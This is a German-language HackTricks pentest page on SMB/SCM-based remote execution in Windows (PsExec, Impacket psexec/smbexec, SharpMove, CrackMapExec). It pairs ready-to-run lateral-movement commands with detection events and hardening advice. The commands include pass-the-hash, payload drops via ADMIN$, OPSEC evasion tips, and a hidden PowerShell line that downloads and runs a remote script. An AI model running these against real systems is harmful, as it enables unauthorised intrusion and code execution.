# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Wie funktionieren sie?

Diese Techniken missbrauchen den Windows Service Control Manager (SCM) remote über SMB/RPC, um Befehle auf einem Zielhost auszuführen. Der übliche Ablauf ist:

1. Am Ziel authentifizieren und über SMB (TCP/445) auf den ADMIN$-Share zugreifen.
2. Eine ausführbare Datei kopieren oder eine LOLBAS-Befehlszeile angeben, die der Service ausführen soll.
3. Über SCM (MS-SCMR über \PIPE\svcctl) remote einen Service erstellen, der auf diesen Befehl oder diese Binärdatei verweist.
4. Den Service starten, um die Payload auszuführen, und optional stdin/stdout über eine Named Pipe erfassen.
5. Den Service stoppen und aufräumen (den Service sowie alle abgelegten Binärdateien löschen).

Anforderungen/Voraussetzungen:
- Lokaler Administrator auf dem Ziel (SeCreateServicePrivilege) oder explizite Berechtigungen zum Erstellen von Services auf dem Ziel.
- SMB (445) muss erreichbar und der ADMIN$-Share verfügbar sein; Remote Service Management muss durch die Host-Firewall erlaubt sein.
- UAC Remote Restrictions: Bei lokalen Konten kann die Token-Filterung den Zugriff eines Administrators über das Netzwerk blockieren, sofern nicht der integrierte Administrator oder LocalAccountTokenFilterPolicy=1 verwendet wird.
- Kerberos vs. NTLM: Die Verwendung eines Hostnamens/FQDN aktiviert Kerberos; bei einer Verbindung über die IP-Adresse wird häufig auf NTLM zurückgegriffen (und dies kann in gehärteten Umgebungen blockiert sein).

### Manuelles ScExec/WinExec über sc.exe

Das folgende Beispiel zeigt einen minimalen Ansatz zum Erstellen eines Services. Das Service-Image kann eine abgelegte EXE oder ein LOLBAS wie cmd.exe oder powershell.exe sein.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Hinweise:
- Beim Starten einer Nicht-Service-EXE ist ein Timeout-Fehler zu erwarten; die Ausführung erfolgt trotzdem.
- Für eine OPSEC-freundlichere Vorgehensweise sollten dateilose Befehle (`cmd /c`, `powershell -enc`) bevorzugt oder abgelegte Artefakte gelöscht werden.

Weitere detaillierte Schritte finden sich unter: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Tools und Beispiele

### Sysinternals PsExec.exe

- Klassisches Admin-Tool, das SMB verwendet, um PSEXESVC.exe in ADMIN$ abzulegen, einen temporären Service (Standardname PSEXESVC) zu installieren und die I/O über Named Pipes weiterzuleiten.
- Beispielverwendungen:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Du kannst direkt über Sysinternals Live via WebDAV starten:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Hinterlässt Ereignisse zur Installation/Deinstallation des Service (der Service-Name lautet häufig PSEXESVC, sofern nicht -r verwendet wird) und erstellt während der Ausführung C:\Windows\PSEXESVC.exe.

### Impacket psexec.py (PsExec-like)

- Verwendet einen eingebetteten RemCom-ähnlichen Service. Legt über ADMIN$ eine kurzlebige Service-Binary ab (üblicherweise mit zufälligem Namen), erstellt einen Service (standardmäßig häufig RemComSvc) und proxyt die I/O über eine Named Pipe.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artefakte
- Temporäre EXE in C:\Windows\ (8 zufällige Zeichen). Der Dienstname ist standardmäßig RemComSvc, sofern er nicht überschrieben wird.

### Impacket smbexec.py (SMBExec)

- Erstellt einen temporären Dienst, der cmd.exe startet und eine Named Pipe für I/O verwendet. Vermeidet im Allgemeinen das Ablegen einer vollständigen EXE-Payload; die Befehlsausführung ist halbinteraktiv.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral und SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementiert mehrere Methoden für laterale Bewegungen, einschließlich service-based exec.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) umfasst die Änderung/Erstellung von Diensten, um einen Befehl remote auszuführen.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Du kannst CrackMapExec auch verwenden, um über verschiedene Backends (psexec/smbexec/wmiexec) Befehle auszuführen:
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, Erkennung und Artefakte

Typische Host-/Netzwerk-Artefakte bei der Verwendung von PsExec-ähnlichen Techniken:
- Security 4624 (Logon Type 3) und 4672 (Special Privileges) auf dem Zielsystem für das verwendete Administratorkonto.
- Security 5140/5145 File Share- und File Share Detailed-Ereignisse, die den Zugriff auf ADMIN$ sowie das Erstellen/Schreiben von Service-Binaries anzeigen (z. B. PSEXESVC.exe oder eine zufällige 8-stellige .exe).
- Security 7045 Service Install auf dem Zielsystem: Servicenamen wie PSEXESVC, RemComSvc oder benutzerdefinierte Namen (-r / -service-name).
- Sysmon 1 (Process Create) für services.exe oder das Service-Image, 3 (Network Connect), 11 (File Create) in C:\Windows\, 17/18 (Pipe Created/Connected) für Pipes wie \\.\pipe\psexesvc, \\.\pipe\remcom_* oder entsprechende zufällige Varianten.
- Registry-Artefakt für die Sysinternals-EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 auf dem Operator-Host (falls nicht unterdrückt).

Hunting-Ideen
- Bei Service-Installationen alarmieren, wenn der ImagePath cmd.exe /c, powershell.exe oder TEMP-Verzeichnisse enthält.
- Nach Prozesserstellungen suchen, bei denen ParentImage C:\Windows\PSEXESVC.exe ist, oder nach untergeordneten Prozessen von services.exe, die als LOCAL SYSTEM ausgeführt werden und Shells starten.
- Benannte Pipes markieren, die auf -stdin/-stdout/-stderr enden, oder bekannte PsExec-Clone-Pipenamen verwenden.

## Fehlerbehebung bei häufigen Problemen
- Access is denied (5) beim Erstellen von Services: kein echter lokaler Administrator, UAC-Remoteeinschränkungen für lokale Konten oder EDR-Manipulationsschutz für den Pfad des Service-Binaries.
- The network path was not found (53) oder keine Verbindung zu ADMIN$: Firewall blockiert SMB/RPC oder Admin-Shares sind deaktiviert.
- Kerberos schlägt fehl, aber NTLM ist blockiert: per Hostname/FQDN (nicht IP) verbinden, korrekte SPNs sicherstellen oder bei der Verwendung von Impacket -k/-no-pass mit Tickets angeben.
- Der Start des Services läuft in einen Timeout, aber der Payload wurde ausgeführt: erwartetes Verhalten, wenn es sich nicht um ein echtes Service-Binary handelt; Ausgabe in eine Datei umleiten oder smbexec für Live-I/O verwenden.

## Hinweise zur Härtung
- Windows 11 24H2 und Windows Server 2025 erfordern standardmäßig SMB signing für ausgehende (und unter Windows 11 eingehende) Verbindungen. Dies verhindert die legitime Verwendung von PsExec mit gültigen Zugangsdaten nicht, verhindert jedoch unsigned SMB relay abuse und kann Geräte beeinträchtigen, die signing nicht unterstützen.<sup>[[2]](#references)</sup>
- Das neue NTLM-Blocking des SMB-Clients (Windows 11 24H2/Server 2025) kann den NTLM-Fallback verhindern, wenn eine Verbindung per IP oder zu Servern ohne Kerberos hergestellt wird. In gehärteten Umgebungen wird dadurch NTLM-basiertes PsExec/SMBExec unterbrochen; Kerberos verwenden (Hostname/FQDN) oder, falls legitim erforderlich, Ausnahmen konfigurieren.<sup>[[2]](#references)</sup>
- Prinzip der geringsten Privilegien: Mitgliedschaften in der Gruppe der lokalen Administratoren minimieren, Just-in-Time/Just-Enough Admin bevorzugen, LAPS erzwingen sowie Service-Installationen mit Ereignis 7045 überwachen und entsprechende Alarme einrichten.

## Siehe auch

- WMI-based remote exec (oft stärker fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-based remote exec:

{{#ref}}
./winrm.md
{{#endref}}

## Referenzen

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
